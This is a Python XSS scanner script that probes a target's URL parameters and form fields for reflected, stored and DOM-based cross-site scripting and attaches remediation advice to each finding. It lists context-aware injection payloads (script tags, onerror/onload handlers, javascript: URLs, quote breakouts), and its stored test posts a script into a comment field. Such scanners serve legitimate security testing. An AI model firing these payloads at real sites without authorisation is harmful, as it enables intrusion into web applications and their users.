#!/usr/bin/env python3
"""
Advanced XSS Scanner
- Reflected XSS (GET/POST)
- Stored XSS (persisted payloads)
- DOM-based XSS (JS analysis)
- Context-aware payloads
"""

import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup

class XSSScanner:
    def __init__(self, target_url):
        self.target = target_url
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'XSSScanner/2.0'})
        
        # Context-aware payloads
        self.payloads = {
            'html_context': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>"
            ],
            'attribute_context': [
                "\" onload=\"alert('XSS')\"",
                "' onmouseover='alert(\"XSS\")'",
                "javascript:alert('XSS')"
            ],
            'js_context': [
                "'-alert('XSS')-'",
                "\";alert('XSS');//",
                "</script><script>alert('XSS')</script>"
            ]
        }
        
        # Detection signatures
        self.reflected_sigs = ['<script', 'onerror=', 'onload=', 'javascript:']
    
    def scan_all(self, endpoints):
        """Main XSS scanning orchestrator"""
        for endpoint in endpoints:
            # Test reflected XSS
            self._test_reflected(endpoint)
            
            # Test DOM-based XSS
            self._test_dom_based(endpoint)
        
        return self.vulnerabilities
    
    def _test_reflected(self, url):
        """Test Reflected XSS on GET/POST parameters"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name in params.keys():
            for context, payloads in self.payloads.items():
                for payload in payloads:
                    try:
                        # Build test URL
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                        
                        response = self.session.get(test_url, timeout=5)
                        
                        # Check reflection
                        if self._is_reflected(payload, response.text):
                            # Verify it's not encoded
                            if not self._is_safely_encoded(payload, response.text):
                                self.vulnerabilities.append({
                                    'tool': 'xss_scanner',
                                    'type': 'Reflected XSS',
                                    'name': 'Cross-Site Scripting (Reflected)',
                                    'severity': 'high',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'context': context,
                                    'description': f"Reflected XSS in '{param_name}' parameter ({context})",
                                    'evidence': self._extract_evidence(response.text, payload),
                                    'remediation': self._get_remediation('reflected')
                                })
                                break  # Found vuln, next param
                    except:
                        pass
    
    def _test_stored(self, url, form_data):
        """Test Stored XSS (requires form submission)"""
        marker = f"XSS_{int(time.time())}"
        payload = f"<script>alert('{marker}')</script>"
        
        try:
            # Submit payload
            response = self.session.post(url, data={**form_data, 'comment': payload}, timeout=10)
            
            # Check if stored
            if payload in response.text or marker in response.text:
                self.vulnerabilities.append({
                    'tool': 'xss_scanner',
                    'type': 'Stored XSS',
                    'name': 'Cross-Site Scripting (Stored)',
                    'severity': 'critical',
                    'url': url,
                    'payload': payload,
                    'description': 'Stored XSS detected - payload persisted',
                    'remediation': self._get_remediation('stored')
                })
        except:
            pass
    
    def _test_dom_based(self, url):
        """Test DOM-based XSS by analyzing JavaScript"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find inline JavaScript
            for script in soup.find_all('script'):
                if not script.string:
                    continue
                
                js_code = script.string
                
                # Look for dangerous sinks
                dangerous_sinks = [
                    'document.write',
                    'innerHTML',
                    'outerHTML',
                    'eval(',
                    'setTimeout(',
                    'setInterval('
                ]
                
                # Check if user input flows to sink
                for sink in dangerous_sinks:
                    if sink in js_code and any(src in js_code for src in ['location.hash', 'location.search', 'document.URL']):
                        self.vulnerabilities.append({
                            'tool': 'xss_scanner',
                            'type': 'DOM-based XSS',
                            'name': 'Cross-Site Scripting (DOM)',
                            'severity': 'high',
                            'url': url,
                            'sink': sink,
                            'description': f'DOM XSS: User input flows to {sink}',
                            'evidence': js_code[:200],
                            'remediation': self._get_remediation('dom')
                        })
                        break
        except:
            pass
    
    def _is_reflected(self, payload, response_text):
        """Check if payload is reflected"""
        return payload in response_text
    
    def _is_safely_encoded(self, payload, response_text):
        """Check if payload is HTML encoded"""
        safe_versions = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;').replace("'", '&#39;'),
        ]
        return any(safe in response_text for safe in safe_versions)
    
    def _extract_evidence(self, html, payload):
        """Extract surrounding context"""
        pos = html.find(payload)
        if pos == -1:
            return payload
        
        start = max(0, pos - 50)
        end = min(len(html), pos + len(payload) + 50)
        return '...' + html[start:end] + '...'
    
    def _get_remediation(self, xss_type):
        """Get remediation advice"""
        remediations = {
            'reflected': 'Encode all user input before rendering in HTML. Use context-appropriate encoding (HTML, JS, URL).',
            'stored': 'Sanitize input on storage AND encode on output. Implement Content Security Policy (CSP).',
            'dom': 'Avoid dangerous sinks (innerHTML, eval). Use safe APIs like textContent. Validate and encode data.'
        }
        return remediations.get(xss_type, 'Implement proper input validation and output encoding.')